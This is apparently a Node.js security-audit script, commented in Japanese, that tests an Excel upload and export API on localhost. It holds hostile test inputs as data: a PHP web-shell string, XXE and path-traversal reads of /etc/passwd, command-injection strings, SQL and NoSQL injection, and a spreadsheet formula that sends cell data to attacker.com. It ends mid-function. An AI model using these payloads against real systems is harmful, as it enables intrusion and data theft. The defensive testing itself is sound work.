/**
 * Excel機能セキュリティ監査スクリプト
 * ファイルアップロード、処理、ダウンロードの包括的セキュリティテスト
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');
const FormData = require('form-data');
const { createWriteStream } = require('fs');
const xlsx = require('xlsx');

class ExcelSecurityAuditor {
  constructor(baseUrl = 'http://localhost:3001', authToken = null) {
    this.baseUrl = baseUrl;
    this.authToken = authToken;
    this.auditResults = {
      totalTests: 0,
      passedTests: 0,
      failedTests: 0,
      criticalIssues: [],
      warnings: [],
      recommendations: []
    };
  }

  // 認証ヘッダーを取得
  getAuthHeaders() {
    return this.authToken ? { Authorization: `Bearer ${this.authToken}` } : {};
  }

  // テスト実行のメインメソッド
  async runFullSecurityAudit() {
    console.log('🔒 Excel機能セキュリティ監査を開始します...\n');

    await this.testFileUploadSecurity();
    await this.testFileProcessingSecurity();
    await this.testAccessControl();
    await this.testDataValidation();
    await this.testStorageSecurity();
    await this.testDownloadSecurity();
    await this.testRateLimiting();
    await this.testOWASPTop10();

    this.generateAuditReport();
  }

  // 1. ファイルアップロードセキュリティテスト
  async testFileUploadSecurity() {
    console.log('📤 ファイルアップロードセキュリティテスト');

    // 悪意のあるファイル形式のテスト
    const maliciousFiles = [
      { name: 'malware.exe', content: 'MZ\x90\x00\x03\x00\x00\x00', type: 'application/x-executable' },
      { name: 'script.js', content: 'alert("XSS")', type: 'application/javascript' },
      { name: 'shell.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-php' },
      { name: 'macro.xlsm', content: this.createMacroEnabledExcel(), type: 'application/vnd.ms-excel.sheet.macroEnabled.12' },
      { name: 'huge.xlsx', content: this.createOversizedExcel(), type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' },
      { name: 'zip.xlsx', content: this.createZipBomb(), type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' }
    ];

    for (const file of maliciousFiles) {
      await this.testMaliciousFileUpload(file);
    }

    // ファイルサイズ制限テスト
    await this.testFileSizeLimits();

    // MIME type spoofing テスト
    await this.testMimeTypeSpoofing();

    // ファイル名セキュリティテスト
    await this.testFileNameSecurity();
  }

  // 悪意のあるファイルアップロードテスト
  async testMaliciousFileUpload(file) {
    try {
      const formData = new FormData();
      formData.append('excelFile', Buffer.from(file.content), {
        filename: file.name,
        contentType: file.type
      });

      const response = await axios.post(
        `${this.baseUrl}/api/excel/read`,
        formData,
        {
          headers: {
            ...formData.getHeaders(),
            ...this.getAuthHeaders()
          },
          validateStatus: () => true
        }
      );

      if (response.status === 200) {
        this.auditResults.criticalIssues.push({
          severity: 'CRITICAL',
          test: 'Malicious File Upload',
          issue: `悪意のあるファイル ${file.name} が正常に処理されました`,
          recommendation: 'ファイルタイプ検証とマルウェアスキャンを強化してください'
        });
        this.auditResults.failedTests++;
      } else {
        console.log(`  ✅ ${file.name} - 正しく拒否されました (${response.status})`);
        this.auditResults.passedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log(`  ✅ ${file.name} - エラーで拒否されました`);
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // ファイルサイズ制限テスト
  async testFileSizeLimits() {
    console.log('  📏 ファイルサイズ制限テスト');

    // 制限を超える大きなファイルを作成
    const oversizedContent = Buffer.alloc(11 * 1024 * 1024, 'A'); // 11MB

    try {
      const formData = new FormData();
      formData.append('excelFile', oversizedContent, {
        filename: 'oversized.xlsx',
        contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
      });

      const response = await axios.post(
        `${this.baseUrl}/api/excel/read`,
        formData,
        {
          headers: {
            ...formData.getHeaders(),
            ...this.getAuthHeaders()
          },
          validateStatus: () => true
        }
      );

      if (response.status === 413 || response.status === 400) {
        console.log('    ✅ 大きなファイルが正しく拒否されました');
        this.auditResults.passedTests++;
      } else {
        this.auditResults.criticalIssues.push({
          severity: 'HIGH',
          test: 'File Size Limit',
          issue: '制限を超えるファイルサイズが受け入れられました',
          recommendation: 'ファイルサイズ制限を厳格に適用してください'
        });
        this.auditResults.failedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log('    ✅ ネットワークレベルで大きなファイルが拒否されました');
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // MIME type spoofing テスト
  async testMimeTypeSpoofing() {
    console.log('  🎭 MIME type spoofingテスト');

    const spoofedFile = {
      content: '#!/bin/bash\necho "Malicious script"',
      filename: 'fake.xlsx',
      contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
    };

    try {
      const formData = new FormData();
      formData.append('excelFile', Buffer.from(spoofedFile.content), spoofedFile);

      const response = await axios.post(
        `${this.baseUrl}/api/excel/read`,
        formData,
        {
          headers: {
            ...formData.getHeaders(),
            ...this.getAuthHeaders()
          },
          validateStatus: () => true
        }
      );

      if (response.status === 400 || response.status === 415) {
        console.log('    ✅ MIME type spoofingが検出され拒否されました');
        this.auditResults.passedTests++;
      } else {
        this.auditResults.criticalIssues.push({
          severity: 'HIGH',
          test: 'MIME Type Spoofing',
          issue: 'MIME typeの偽装されたファイルが処理されました',
          recommendation: 'ファイル内容とMIME typeの一致性を検証してください'
        });
        this.auditResults.failedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log('    ✅ MIME type spoofingがエラーで拒否されました');
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // ファイル名セキュリティテスト
  async testFileNameSecurity() {
    console.log('  📁 ファイル名セキュリティテスト');

    const dangerousFilenames = [
      '../../../etc/passwd',
      '..\\..\\windows\\system32\\cmd.exe',
      'file<script>alert("xss")</script>.xlsx',
      'file"with"quotes.xlsx',
      'file|with|pipes.xlsx',
      'file\x00null.xlsx',
      'file\r\nnewline.xlsx'
    ];

    for (const filename of dangerousFilenames) {
      await this.testDangerousFilename(filename);
    }
  }

  // 危険なファイル名テスト
  async testDangerousFilename(filename) {
    try {
      const formData = new FormData();
      const validExcelContent = this.createValidExcel();
      formData.append('excelFile', validExcelContent, {
        filename,
        contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
      });

      const response = await axios.post(
        `${this.baseUrl}/api/excel/read`,
        formData,
        {
          headers: {
            ...formData.getHeaders(),
            ...this.getAuthHeaders()
          },
          validateStatus: () => true
        }
      );

      if (response.status >= 400) {
        console.log(`    ✅ 危険なファイル名 "${filename}" が拒否されました`);
        this.auditResults.passedTests++;
      } else {
        this.auditResults.warnings.push({
          severity: 'MEDIUM',
          test: 'Dangerous Filename',
          issue: `危険な文字を含むファイル名 "${filename}" が処理されました`,
          recommendation: 'ファイル名のサニタイゼーションを強化してください'
        });
        this.auditResults.failedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log(`    ✅ 危険なファイル名 "${filename}" がエラーで拒否されました`);
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // 2. ファイル処理セキュリティテスト
  async testFileProcessingSecurity() {
    console.log('\n⚙️ ファイル処理セキュリティテスト');

    await this.testXMLEntityExpansion();
    await this.testExternalEntityReferences();
    await this.testMacroSecurity();
    await this.testFormulaInjection();
  }

  // XML Entity Expansion (XXE) テスト
  async testXMLEntityExpansion() {
    console.log('  🔍 XML Entity Expansion攻撃テスト');

    const xxePayload = this.createXXEPayload();
    
    try {
      const formData = new FormData();
      formData.append('excelFile', xxePayload, {
        filename: 'xxe-test.xlsx',
        contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
      });

      const response = await axios.post(
        `${this.baseUrl}/api/excel/read`,
        formData,
        {
          headers: {
            ...formData.getHeaders(),
            ...this.getAuthHeaders()
          },
          validateStatus: () => true
        }
      );

      if (response.data && response.data.toString().includes('/etc/passwd')) {
        this.auditResults.criticalIssues.push({
          severity: 'CRITICAL',
          test: 'XXE Vulnerability',
          issue: 'XML External Entity攻撃が成功しました',
          recommendation: 'XMLパーサーの外部エンティティ処理を無効化してください'
        });
        this.auditResults.failedTests++;
      } else {
        console.log('    ✅ XXE攻撃が防御されました');
        this.auditResults.passedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log('    ✅ XXE攻撃がエラーで防御されました');
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // フォーミュラインジェクションテスト
  async testFormulaInjection() {
    console.log('  📊 フォーミュラインジェクションテスト');

    const formulaPayloads = [
      '=cmd|"/c calc"!A1',
      '=HYPERLINK("http://malicious.site","Click here")',
      '=WEBSERVICE("http://attacker.com/steal?data="&A1)',
      '=IMPORTDATA("http://malicious.site/malware.csv")',
      '@SUM(1+9)*cmd|"/c calc"!A0'
    ];

    for (const payload of formulaPayloads) {
      await this.testFormulaInjectionPayload(payload);
    }
  }

  // フォーミュラインジェクションペイロードテスト
  async testFormulaInjectionPayload(payload) {
    try {
      const formData = {
        subsidyType: 'it-donyu',
        formData: {
          company_name: payload,
          representative_name: 'Test User',
          employee_count: '10'
        }
      };

      const response = await axios.post(
        `${this.baseUrl}/api/excel/write`,
        formData,
        {
          headers: {
            'Content-Type': 'application/json',
            ...this.getAuthHeaders()
          },
          validateStatus: () => true
        }
      );

      if (response.status === 200) {
        // ダウンロードされたファイルでペイロードの有無を確認
        const downloadUrl = response.data.data?.downloadUrls?.[0];
        if (downloadUrl) {
          const fileContent = await this.downloadAndCheckFile(downloadUrl);
          if (fileContent.includes(payload.substring(1))) { // '='を除いた部分
            this.auditResults.criticalIssues.push({
              severity: 'HIGH',
              test: 'Formula Injection',
              issue: `フォーミュラインジェクション "${payload}" が検出されました`,
              recommendation: 'フォーミュラ文字の前にシングルクォートを追加してエスケープしてください'
            });
            this.auditResults.failedTests++;
          } else {
            console.log(`    ✅ フォーミュラ "${payload}" が適切にエスケープされました`);
            this.auditResults.passedTests++;
          }
        }
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log(`    ✅ フォーミュラ "${payload}" がエラーで拒否されました`);
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // 3. アクセス制御テスト
  async testAccessControl() {
    console.log('\n🔐 アクセス制御テスト');

    await this.testUnauthenticatedAccess();
    await this.testInvalidTokenAccess();
    await this.testResourceAccess();
  }

  // 未認証アクセステスト
  async testUnauthenticatedAccess() {
    console.log('  🚫 未認証アクセステスト');

    const endpoints = [
      { method: 'post', path: '/api/excel/read' },
      { method: 'post', path: '/api/excel/write' },
      { method: 'get', path: '/api/excel/template/it-donyu' },
      { method: 'post', path: '/api/excel/batch-export' }
    ];

    for (const endpoint of endpoints) {
      await this.testEndpointAuthentication(endpoint);
    }
  }

  // エンドポイント認証テスト
  async testEndpointAuthentication(endpoint) {
    try {
      const response = await axios[endpoint.method](
        `${this.baseUrl}${endpoint.path}`,
        endpoint.method === 'post' ? {} : undefined,
        { validateStatus: () => true }
      );

      if (response.status === 401 || response.status === 403) {
        console.log(`    ✅ ${endpoint.method.toUpperCase()} ${endpoint.path} - 認証が必要`);
        this.auditResults.passedTests++;
      } else {
        this.auditResults.criticalIssues.push({
          severity: 'CRITICAL',
          test: 'Authentication Bypass',
          issue: `${endpoint.method.toUpperCase()} ${endpoint.path} が未認証でアクセス可能です`,
          recommendation: '認証ミドルウェアが正しく適用されているか確認してください'
        });
        this.auditResults.failedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log(`    ⚠️ ${endpoint.method.toUpperCase()} ${endpoint.path} - 接続エラー`);
      this.auditResults.totalTests++;
    }
  }

  // 4. データ検証テスト
  async testDataValidation() {
    console.log('\n🔍 データ検証テスト');

    await this.testInputValidation();
    await this.testSQLInjection();
    await this.testXSSPrevention();
  }

  // 入力値検証テスト
  async testInputValidation() {
    console.log('  ✅ 入力値検証テスト');

    const invalidInputs = [
      {
        name: '不正なsubsidyType',
        data: { subsidyType: 'invalid-type', formData: {} }
      },
      {
        name: '空のformData',
        data: { subsidyType: 'it-donyu', formData: null }
      },
      {
        name: '異常に長い文字列',
        data: { 
          subsidyType: 'it-donyu',
          formData: { company_name: 'A'.repeat(10000) }
        }
      },
      {
        name: '数値フィールドに文字列',
        data: {
          subsidyType: 'it-donyu',
          formData: { employee_count: 'not-a-number' }
        }
      }
    ];

    for (const input of invalidInputs) {
      await this.testInvalidInput(input);
    }
  }

  // 不正入力テスト
  async testInvalidInput(input) {
    try {
      const response = await axios.post(
        `${this.baseUrl}/api/excel/write`,
        input.data,
        {
          headers: {
            'Content-Type': 'application/json',
            ...this.getAuthHeaders()
          },
          validateStatus: () => true
        }
      );

      if (response.status >= 400) {
        console.log(`    ✅ ${input.name} - 正しく検証されました`);
        this.auditResults.passedTests++;
      } else {
        this.auditResults.warnings.push({
          severity: 'MEDIUM',
          test: 'Input Validation',
          issue: `${input.name} が検証を通過しました`,
          recommendation: '入力値検証を強化してください'
        });
        this.auditResults.failedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log(`    ✅ ${input.name} - エラーで拒否されました`);
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // 5. ストレージセキュリティテスト
  async testStorageSecurity() {
    console.log('\n💾 ストレージセキュリティテスト');

    await this.testFileStoragePermissions();
    await this.testTemporaryFileCleanup();
    await this.testDataEncryption();
  }

  // ファイルストレージ権限テスト
  async testFileStoragePermissions() {
    console.log('  🔒 ファイルストレージ権限テスト');

    // 直接ファイルアクセステスト
    const testUrls = [
      '/uploads/',
      '/tmp/',
      '/storage/',
      '/files/',
      '/.env',
      '/config/',
      '/logs/'
    ];

    for (const url of testUrls) {
      await this.testDirectFileAccess(url);
    }
  }

  // 直接ファイルアクセステスト
  async testDirectFileAccess(path) {
    try {
      const response = await axios.get(`${this.baseUrl}${path}`, {
        validateStatus: () => true
      });

      if (response.status === 403 || response.status === 404) {
        console.log(`    ✅ ${path} - アクセスが制限されています`);
        this.auditResults.passedTests++;
      } else {
        this.auditResults.warnings.push({
          severity: 'MEDIUM',
          test: 'Direct File Access',
          issue: `${path} に直接アクセスできる可能性があります`,
          recommendation: 'ファイルアクセス権限を制限してください'
        });
        this.auditResults.failedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log(`    ✅ ${path} - 接続エラー（保護されています）`);
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // 6. ダウンロードセキュリティテスト
  async testDownloadSecurity() {
    console.log('\n📥 ダウンロードセキュリティテスト');

    await this.testDownloadAuthentication();
    await this.testPathTraversal();
    await this.testDownloadLimits();
  }

  // ダウンロード認証テスト
  async testDownloadAuthentication() {
    console.log('  🔐 ダウンロード認証テスト');

    // 有効なExcelファイルを作成してダウンロードテスト
    try {
      const response = await axios.get(
        `${this.baseUrl}/api/excel/template/it-donyu`,
        {
          validateStatus: () => true
        }
      );

      if (response.status === 401 || response.status === 403) {
        console.log('    ✅ ダウンロードには認証が必要です');
        this.auditResults.passedTests++;
      } else {
        this.auditResults.warnings.push({
          severity: 'MEDIUM',
          test: 'Download Authentication',
          issue: 'ダウンロードが未認証でアクセス可能です',
          recommendation: 'ダウンロードエンドポイントに認証を追加してください'
        });
        this.auditResults.failedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log('    ✅ ダウンロード認証テスト - 接続エラー');
      this.auditResults.totalTests++;
    }
  }

  // パストラバーサルテスト
  async testPathTraversal() {
    console.log('  📁 パストラバーサルテスト');

    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      '..//..//..//etc/passwd'
    ];

    for (const payload of pathTraversalPayloads) {
      await this.testPathTraversalPayload(payload);
    }
  }

  // パストラバーサルペイロードテスト
  async testPathTraversalPayload(payload) {
    try {
      const response = await axios.get(
        `${this.baseUrl}/api/excel/template/it-donyu`,
        {
          params: { templateName: payload },
          headers: this.getAuthHeaders(),
          validateStatus: () => true
        }
      );

      if (response.status >= 400) {
        console.log(`    ✅ パストラバーサル "${payload}" が拒否されました`);
        this.auditResults.passedTests++;
      } else if (response.data && response.data.toString().includes('root:')) {
        this.auditResults.criticalIssues.push({
          severity: 'CRITICAL',
          test: 'Path Traversal',
          issue: `パストラバーサル攻撃 "${payload}" が成功しました`,
          recommendation: 'ファイルパスの検証とサニタイゼーションを実装してください'
        });
        this.auditResults.failedTests++;
      } else {
        console.log(`    ✅ パストラバーサル "${payload}" が防御されました`);
        this.auditResults.passedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log(`    ✅ パストラバーサル "${payload}" がエラーで拒否されました`);
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // 7. レート制限テスト
  async testRateLimiting() {
    console.log('\n⏱️ レート制限テスト');

    const requests = [];
    const maxRequests = 15; // 制限を超える数

    console.log(`  🚀 ${maxRequests}回の連続リクエストを送信中...`);

    for (let i = 0; i < maxRequests; i++) {
      requests.push(
        axios.post(
          `${this.baseUrl}/api/excel/write`,
          {
            subsidyType: 'it-donyu',
            formData: { company_name: `Test ${i}` }
          },
          {
            headers: {
              'Content-Type': 'application/json',
              ...this.getAuthHeaders()
            },
            validateStatus: () => true
          }
        )
      );
    }

    try {
      const responses = await Promise.all(requests);
      const rateLimitedCount = responses.filter(r => r.status === 429).length;

      if (rateLimitedCount > 0) {
        console.log(`    ✅ ${rateLimitedCount}/${maxRequests} のリクエストがレート制限されました`);
        this.auditResults.passedTests++;
      } else {
        this.auditResults.warnings.push({
          severity: 'MEDIUM',
          test: 'Rate Limiting',
          issue: 'レート制限が機能していません',
          recommendation: 'APIレート制限を実装してください'
        });
        this.auditResults.failedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log('    ⚠️ レート制限テスト - 接続エラー');
      this.auditResults.totalTests++;
    }
  }

  // 8. OWASP Top 10 テスト
  async testOWASPTop10() {
    console.log('\n🛡️ OWASP Top 10 セキュリティテスト');

    // A01: Broken Access Control
    await this.testBrokenAccessControl();

    // A02: Cryptographic Failures
    await this.testCryptographicFailures();

    // A03: Injection
    await this.testInjectionAttacks();

    // A04: Insecure Design
    await this.testInsecureDesign();

    // A05: Security Misconfiguration
    await this.testSecurityMisconfiguration();
  }

  // アクセス制御の脆弱性テスト
  async testBrokenAccessControl() {
    console.log('  🔓 A01: Broken Access Control テスト');

    // 他ユーザーのリソースへのアクセステスト
    const testUrls = [
      '/api/excel/user/1/files',
      '/api/excel/admin/settings',
      '/api/excel/internal/config'
    ];

    for (const url of testUrls) {
      await this.testUnauthorizedResourceAccess(url);
    }
  }

  // 未承認リソースアクセステスト
  async testUnauthorizedResourceAccess(url) {
    try {
      const response = await axios.get(`${this.baseUrl}${url}`, {
        headers: this.getAuthHeaders(),
        validateStatus: () => true
      });

      if (response.status === 403 || response.status === 404) {
        console.log(`    ✅ ${url} - アクセスが制限されています`);
        this.auditResults.passedTests++;
      } else {
        this.auditResults.warnings.push({
          severity: 'HIGH',
          test: 'Unauthorized Resource Access',
          issue: `${url} へのアクセスが許可されています`,
          recommendation: 'リソースアクセス制御を確認してください'
        });
        this.auditResults.failedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log(`    ✅ ${url} - 接続エラー（保護されています）`);
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // 暗号化失敗テスト
  async testCryptographicFailures() {
    console.log('  🔐 A02: Cryptographic Failures テスト');

    // HTTPSの使用確認
    if (this.baseUrl.startsWith('http://')) {
      this.auditResults.warnings.push({
        severity: 'HIGH',
        test: 'Cryptographic Failures',
        issue: 'HTTPが使用されています（HTTPS推奨）',
        recommendation: '本番環境ではHTTPSを使用してください'
      });
      this.auditResults.failedTests++;
    } else {
      console.log('    ✅ HTTPSが使用されています');
      this.auditResults.passedTests++;
    }

    this.auditResults.totalTests++;
  }

  // インジェクション攻撃テスト
  async testInjectionAttacks() {
    console.log('  💉 A03: Injection テスト');

    await this.testSQLInjection();
    await this.testNoSQLInjection();
    await this.testCommandInjection();
  }

  // SQLインジェクションテスト
  async testSQLInjection() {
    const sqlPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "1; SELECT * FROM users",
      "' UNION SELECT * FROM information_schema.tables --",
      "admin'/*"
    ];

    for (const payload of sqlPayloads) {
      await this.testSQLInjectionPayload(payload);
    }
  }

  // SQLインジェクションペイロードテスト
  async testSQLInjectionPayload(payload) {
    try {
      const response = await axios.post(
        `${this.baseUrl}/api/excel/write`,
        {
          subsidyType: 'it-donyu',
          formData: { company_name: payload }
        },
        {
          headers: {
            'Content-Type': 'application/json',
            ...this.getAuthHeaders()
          },
          validateStatus: () => true
        }
      );

      // レスポンスにSQLエラーが含まれていないかチェック
      const responseText = JSON.stringify(response.data);
      if (responseText.includes('SQL') || responseText.includes('syntax error')) {
        this.auditResults.criticalIssues.push({
          severity: 'CRITICAL',
          test: 'SQL Injection',
          issue: `SQLインジェクション攻撃 "${payload}" でSQLエラーが露出しました`,
          recommendation: 'パラメータ化クエリを使用し、エラー情報の露出を防いでください'
        });
        this.auditResults.failedTests++;
      } else {
        this.auditResults.passedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // NoSQLインジェクションテスト
  async testNoSQLInjection() {
    const noSqlPayloads = [
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$where": "function() { return true; }"}',
      '{"$regex": ".*"}',
      '{"$or": [{}]}'
    ];

    for (const payload of noSqlPayloads) {
      await this.testNoSQLInjectionPayload(payload);
    }
  }

  // NoSQLインジェクションペイロードテスト
  async testNoSQLInjectionPayload(payload) {
    try {
      const response = await axios.post(
        `${this.baseUrl}/api/excel/write`,
        {
          subsidyType: 'it-donyu',
          formData: { company_name: payload }
        },
        {
          headers: {
            'Content-Type': 'application/json',
            ...this.getAuthHeaders()
          },
          validateStatus: () => true
        }
      );

      // 正常に処理されたかチェック（NoSQLインジェクションが成功していないか）
      if (response.status === 200) {
        console.log(`    ✅ NoSQLインジェクション "${payload}" が適切に処理されました`);
        this.auditResults.passedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // コマンドインジェクションテスト
  async testCommandInjection() {
    const cmdPayloads = [
      '; ls -la',
      '| whoami',
      '& echo "vulnerable"',
      '`cat /etc/passwd`',
      '$(uname -a)',
      '|| ping -c 1 127.0.0.1'
    ];

    for (const payload of cmdPayloads) {
      await this.testCommandInjectionPayload(payload);
    }
  }

  // コマンドインジェクションペイロードテスト
  async testCommandInjectionPayload(payload) {
    try {
      const response = await axios.post(
        `${this.baseUrl}/api/excel/write`,
        {
          subsidyType: 'it-donyu',
          formData: { company_name: payload }
        },
        {
          headers: {
            'Content-Type': 'application/json',
            ...this.getAuthHeaders()
          },
          validateStatus: () => true
        }
      );

      // レスポンスにコマンド実行結果が含まれていないかチェック
      const responseText = JSON.stringify(response.data);
      if (responseText.includes('vulnerable') || responseText.includes('root:')) {
        this.auditResults.criticalIssues.push({
          severity: 'CRITICAL',
          test: 'Command Injection',
          issue: `コマンドインジェクション攻撃 "${payload}" が成功しました`,
          recommendation: 'ユーザー入力をシステムコマンドに渡さないでください'
        });
        this.auditResults.failedTests++;
      } else {
        this.auditResults.passedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // 安全でない設計テスト
  async testInsecureDesign() {
    console.log('  🏗️ A04: Insecure Design テスト');

    // 機密情報の露出チェック
    await this.testInformationDisclosure();
  }

  // 情報開示テスト
  async testInformationDisclosure() {
    const sensitiveEndpoints = [
      '/api/excel/debug',
      '/api/excel/status',
      '/api/excel/health',
      '/api/excel/version',
      '/api/excel/info'
    ];

    for (const endpoint of sensitiveEndpoints) {
      await this.testSensitiveInformationExposure(endpoint);
    }
  }

  // 機密情報露出テスト
  async testSensitiveInformationExposure(endpoint) {
    try {
      const response = await axios.get(`${this.baseUrl}${endpoint}`, {
        validateStatus: () => true
      });

      if (response.status === 200) {
        const sensitivePatterns = [
          /password/i,
          /secret/i,
          /api[_-]?key/i,
          /token/i,
          /database/i,
          /connection/i,
          /version/i,
          /stack trace/i
        ];

        const responseText = JSON.stringify(response.data);
        const foundSensitive = sensitivePatterns.some(pattern => pattern.test(responseText));

        if (foundSensitive) {
          this.auditResults.warnings.push({
            severity: 'MEDIUM',
            test: 'Information Disclosure',
            issue: `${endpoint} で機密情報が露出している可能性があります`,
            recommendation: 'デバッグ情報やシステム情報の露出を制限してください'
          });
          this.auditResults.failedTests++;
        } else {
          this.auditResults.passedTests++;
        }
      } else {
        this.auditResults.passedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // セキュリティ設定ミステスト
  async testSecurityMisconfiguration() {
    console.log('  ⚙️ A05: Security Misconfiguration テスト');

    await this.testSecurityHeaders();
    await this.testErrorHandling();
  }

  // セキュリティヘッダーテスト
  async testSecurityHeaders() {
    try {
      const response = await axios.get(`${this.baseUrl}/api/excel/template/it-donyu`, {
        headers: this.getAuthHeaders(),
        validateStatus: () => true
      });

      const securityHeaders = [
        'X-Content-Type-Options',
        'X-Frame-Options',
        'X-XSS-Protection',
        'Strict-Transport-Security',
        'Content-Security-Policy'
      ];

      let missingHeaders = [];
      for (const header of securityHeaders) {
        if (!response.headers[header.toLowerCase()]) {
          missingHeaders.push(header);
        }
      }

      if (missingHeaders.length > 0) {
        this.auditResults.warnings.push({
          severity: 'MEDIUM',
          test: 'Security Headers',
          issue: `セキュリティヘッダーが不足しています: ${missingHeaders.join(', ')}`,
          recommendation: '適切なセキュリティヘッダーを設定してください'
        });
        this.auditResults.failedTests++;
      } else {
        console.log('    ✅ セキュリティヘッダーが適切に設定されています');
        this.auditResults.passedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log('    ⚠️ セキュリティヘッダーテスト - 接続エラー');
      this.auditResults.totalTests++;
    }
  }

  // エラーハンドリングテスト
  async testErrorHandling() {
    try {
      const response = await axios.post(
        `${this.baseUrl}/api/excel/invalid-endpoint`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            ...this.getAuthHeaders()
          },
          validateStatus: () => true
        }
      );

      const responseText = JSON.stringify(response.data);
      const sensitiveErrorPatterns = [
        /stack trace/i,
        /internal server error/i,
        /database.*error/i,
        /file.*not.*found/i,
        /path.*error/i
      ];

      const hasSensitiveError = sensitiveErrorPatterns.some(pattern => pattern.test(responseText));

      if (hasSensitiveError) {
        this.auditResults.warnings.push({
          severity: 'LOW',
          test: 'Error Handling',
          issue: 'エラーメッセージに機密情報が含まれている可能性があります',
          recommendation: 'エラーメッセージを汎用的な内容に変更してください'
        });
        this.auditResults.failedTests++;
      } else {
        console.log('    ✅ エラーハンドリングが適切です');
        this.auditResults.passedTests++;
      }

      this.auditResults.totalTests++;
    } catch (error) {
      console.log('    ✅ エラーハンドリングテスト - 適切にエラーが処理されました');
      this.auditResults.passedTests++;
      this.auditResults.totalTests++;
    }
  }

  // ヘルパーメソッド：有効なExcelファイル作成
  createValidExcel() {
    const wb = xlsx.utils.book_new();
    const ws = xlsx.utils.aoa_to_sheet([
      ['Name', 'Value'],
      ['Test', '123']
    ]);
    xlsx.utils.book_append_sheet(wb, ws, 'Sheet1');
    return xlsx.write(wb, { type: 'buffer', bookType: 'xlsx' });
  }

  // ヘルパーメソッド：マクロ有効Excelファイル作成
  createMacroEnabledExcel() {
    // シンプルなマクロ有効ファイルのシミュレーション
    return Buffer.from('PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00macro_enabled');
  }

  // ヘルパーメソッド：大容量Excelファイル作成
  createOversizedExcel() {
    return Buffer.alloc(12 * 1024 * 1024, 'A'); // 12MB
  }

  // ヘルパーメソッド：ZIP爆弾作成
  createZipBomb() {
    // ZIP爆弾のシミュレーション
    return Buffer.from('PK\x03\x04\x14\x00\x00\x00\x08\x00zipbomb');
  }

  // ヘルパーメソッド：XXEペイロード作成
  createXXEPayload() {
    const xxeXml = `<?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
      ]>
      <root>&xxe;</root>`;
    return Buffer.from(xxeXml);
  }

  // ファイルダウンロード・チェック
  async downloadAndCheckFile(url) {
    try {
      const response = await axios.get(url, {
        headers: this.getAuthHeaders(),
        responseType: 'arraybuffer'
      });
      return response.data.toString();
    } catch (error) {
      return '';
    }
  }

  // 監査レポート生成
  generateAuditReport() {
    console.log('\n📊 === Excel機能セキュリティ監査レポート ===\n');
    
    const passRate = ((this.auditResults.passedTests / this.auditResults.totalTests) * 100).toFixed(1);
    
    console.log(`📈 テスト結果サマリー:`);
    console.log(`   総テスト数: ${this.auditResults.totalTests}`);
    console.log(`   成功: ${this.auditResults.passedTests}`);
    console.log(`   失敗: ${this.auditResults.failedTests}`);
    console.log(`   成功率: ${passRate}%\n`);

    if (this.auditResults.criticalIssues.length > 0) {
      console.log('🚨 重大な問題:');
      this.auditResults.criticalIssues.forEach((issue, index) => {
        console.log(`   ${index + 1}. [${issue.severity}] ${issue.test}: ${issue.issue}`);
        console.log(`      推奨対策: ${issue.recommendation}\n`);
      });
    }

    if (this.auditResults.warnings.length > 0) {
      console.log('⚠️ 警告:');
      this.auditResults.warnings.forEach((warning, index) => {
        console.log(`   ${index + 1}. [${warning.severity}] ${warning.test}: ${warning.issue}`);
        console.log(`      推奨対策: ${warning.recommendation}\n`);
      });
    }

    if (this.auditResults.recommendations.length > 0) {
